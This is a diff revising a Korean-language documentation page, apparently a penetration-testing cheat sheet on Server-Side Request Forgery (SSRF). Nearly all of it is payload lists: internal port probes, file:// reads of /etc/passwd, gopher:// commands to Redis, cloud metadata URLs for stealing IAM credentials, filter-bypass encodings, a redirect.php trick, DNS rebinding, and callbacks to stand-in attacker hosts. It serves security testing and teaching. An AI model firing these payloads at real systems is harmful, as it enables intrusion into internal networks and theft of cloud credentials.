@@ -1,169 +1,120 @@
 ---
 sidebar_position: 5
+title: Server-Side Request Forgery (SSRF)
 ---
 
-# Server-Side Request Forgery (SSRF)
+# Server-Side Request Forgery (SSRF) 취약점 진단
 
-## 기본 개념
+## Overview
 
-SSRF는 서버가 공격자가 제어하는 URL로 요청을 보내도록 만드는 공격입니다.
+**SSRF (Server-Side Request Forgery)**: 공격자가 웹 애플리케이션 서버를 조종하여(위조된 요청을 만들어) 내부 네트워크나 외부 임의의 서버로 HTTP/다양한 프로토콜 요청을 보내게 만드는 취약점
 
-## 기본 페이로드
+- **위험성**: 방화벽을 우회하여 내부 서비스 접근, 클라우드 메타데이터 탈취, 로컬 파일 읽기 가능
 
-```
-https://<RHOST>/item/2?server=server.<RHOST>/file?id=9&x=
-http://<RHOST>/page?url=http://internal-server/admin
-http://<RHOST>/fetch?url=http://127.0.0.1:80
-```
+---
 
-## 내부 네트워크 스캔
+## 1. Reconnaissance (취약점 식별)
 
-```
-# localhost 변형
-http://127.0.0.1/
-http://localhost/
-http://[::1]/
-http://0.0.0.0/
-http://0177.0.0.1/
-http://2130706433/
-
-# 내부 IP 스캔
-http://192.168.0.1/
-http://192.168.1.1/
-http://10.0.0.1/
-http://172.16.0.1/
+### 기본 페이로드 테스트
+URL 파라미터나 외부 리소스를 가져오는 기능에 공격자 서버 URL 삽입 후 요청 여부 모니터링
+```http
+http://<target>/page?url=http://<attacker-ip>
+http://<target>/fetch?url=http://<attacker-ip>
+http://<target>/item/2?server=http://<attacker-ip>
 ```
 
-## 클라우드 메타데이터
+### 내부 네트워크 포트 스캔
+서버를 프록시로 사용하여 내부(Localhost) 서비스 동작 여부 탐지
+```http
+http://<target>/fetch?url=http://127.0.0.1:22     # SSH
+http://<target>/fetch?url=http://127.0.0.1:80     # HTTP
+http://<target>/fetch?url=http://127.0.0.1:3306   # MySQL
+http://<target>/fetch?url=http://127.0.0.1:6379   # Redis
+```
 
-```bash
-# AWS
-http://169.254.169.254/latest/meta-data/
-http://169.254.169.254/latest/user-data/
-http://169.254.169.254/latest/meta-data/iam/security-credentials/
+---
+
+## 2. Exploitation (공격 수행)
+
+### 로컬 파일 및 서비스 접근 (다양한 프로토콜 활용)
+HTTP 외의 프로토콜 스키마를 사용하여 서버 로컬 자원에 접근
+```http
+# [file://] 로컬 파일 시스템 읽기
+http://<target>/fetch?url=file:///etc/passwd
+http://<target>/fetch?url=file:///c:/windows/win.ini
+
+# [dict://] 내장 서비스(Memcached 등) 정보 추출
+http://<target>/fetch?url=dict://127.0.0.1:11211/stats
+
+# [gopher://] Redis 등 내부 서비스 RCE 연계
+http://<target>/fetch?url=gopher://127.0.0.1:6379/_SET%20test%20value
+
+# [ldap://] LDAP 서비스 접근
+http://<target>/fetch?url=ldap://127.0.0.1:389
+```
+
+### 클라우드 메타데이터 자격증명 탈취
+타겟 서버가 클라우드 인스턴스인 경우 메타데이터 서비스에 접근하여 토큰 탈취
+```http
+# AWS (Amazon Web Services)
+http://<target>/fetch?url=http://169.254.169.254/latest/meta-data/
+http://<target>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
 # Google Cloud
-http://metadata.google.internal/computeMetadata/v1/
-http://metadata/computeMetadata/v1/
+http://<target>/fetch?url=http://metadata.google.internal/computeMetadata/v1/
 
 # Azure
-http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://<target>/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
 ```
 
-## 프로토콜 사용
+---
 
-```
-# File protocol
-file:///etc/passwd
-file:///c:/windows/win.ini
+## 3. Advanced Techniques
 
-# Dict protocol
-dict://127.0.0.1:11211/stats
+### SSRF 블랙리스트 필터링 우회 기법
+`127.0.0.1`이나 `localhost` 문자열이 필터링된 경우 우회
 
-# LDAP
-ldap://127.0.0.1:389
+```http
+# 1. IP 주소 형식 변환
+http://2130706433/          # 10진수 표현 (127.0.0.1)
+http://0177.0.0.1/          # 8진수 혼합
+http://0x7f.0x0.0x0.0x1/    # 16진수 표현
 
-# Gopher (Redis)
-gopher://127.0.0.1:6379/_SET%20test%20value
-```
-
-## 우회 기법
-
-### URL 인코딩
-
-```
-http://127.0.0.1/ → http://%31%32%37%2e%30%2e%30%2e%31/
-```
-
-### 이중 URL 인코딩
-
-```
-http://127.0.0.1/ → http://%25%33%31%25%33%32%25%33%37%2e%25%33%30%2e%25%33%30%2e%25%33%31/
-```
-
-### IP 형식 변경
-
-```
-# 10진수
-http://2130706433/ (127.0.0.1)
-
-# 8진수
-http://0177.0.0.1/
-
-# 16진수
-http://0x7f.0x0.0x0.0x1/
-
-# 혼합
-http://0177.0.0.1/
-http://127.1/
-```
-
-### DNS Rebinding
-
-```
-# 악의적인 DNS 서버 설정
-example.com → 1.2.3.4 (첫 요청)
-example.com → 127.0.0.1 (두번째 요청)
-```
-
-### 리다이렉트 사용
-
-```php
-# redirect.php
-<?php header("Location: http://127.0.0.1/admin"); ?>
-```
-
-```
-http://<RHOST>/fetch?url=http://<LHOST>/redirect.php
-```
-
-## 블랙리스트 우회
-
-```
-# localhost 우회
-http://localtest.me/ (127.0.0.1로 해석)
-http://127。0。0。1/ (유니코드)
+# 2. 대체 도메인 사용 (127.0.0.1로 해석되는 도메인)
+http://localtest.me/
 http://127.0.0.1.nip.io/
 http://127.0.0.1.xip.io/
-http://[0:0:0:0:0:ffff:127.0.0.1]/
 
-# @ 사용
+# 3. 특수 문자 조합 (@, #)
 http://evil.com@127.0.0.1/
-http://127.0.0.1@evil.com/
-
-# # 사용
 http://127.0.0.1#evil.com/
-http://evil.com#127.0.0.1/
+
+# 4. 이중 URL 인코딩
+http://%25%33%31%25%33%32%25%33%37%2e%25%33%30%2e%25%33%30%2e%25%33%31/
 ```
 
-## 포트 스캔
+### 리다이렉트 (Redirect) 우회 및 DNS Rebinding
+서버가 최초 요청 대상만 검증하고 리다이렉션을 따라가는 약점 악용
 
+**HTTP Redirect 활용:**
+```php
+# 공격자 서버에 redirect.php 구성
+<?php header("Location: http://127.0.0.1/admin"); ?>
+
+# 페이로드 주입
+http://<target>/fetch?url=http://<attacker-ip>/redirect.php
 ```
-# 내부 포트 스캔
-http://127.0.0.1:22/
-http://127.0.0.1:80/
-http://127.0.0.1:3306/
-http://127.0.0.1:6379/
-http://127.0.0.1:8080/
+
+**DNS Rebinding:**
+```text
+# 1차 검증 시 정상 IP 응답, 검증 직후 내부망 IP로 DNS 응답 변경 (TTL 0 설정)
+1차 요청 (검증): attacker.com -> 8.8.8.8 (통과)
+2차 요청 (연결): attacker.com -> 127.0.0.1 (공격 성공)
 ```
 
-## Blind SSRF
-
+### Blind SSRF 식별
+화면에 응답값이 노출되지 않는 환경에서는 외부로 DNS 조회가 발생하는지 체크
 ```bash
-# Burp Collaborator 사용
-http://burp-collaborator.com
-
-# 자체 서버 사용
-http://<LHOST>/callback
-
-# DNS 로그 확인
-http://ssrf-test.<YOUR_DOMAIN>/
+# Burp Collaborator 또는 공격자 서버를 이용해 핑백(Pingback) 대기
+http://<target>/fetch?url=http://ssrf-test.attacker.com/
 ```
-
-## 참고
-
-- SSRF로 내부 네트워크 접근 가능
-- 클라우드 메타데이터에서 자격증명 탈취
-- 포트 스캔으로 내부 서비스 발견
-- Blind SSRF는 Out-of-Band 기법 사용
-- file:// 프로토콜로 로컬 파일 읽기 가능
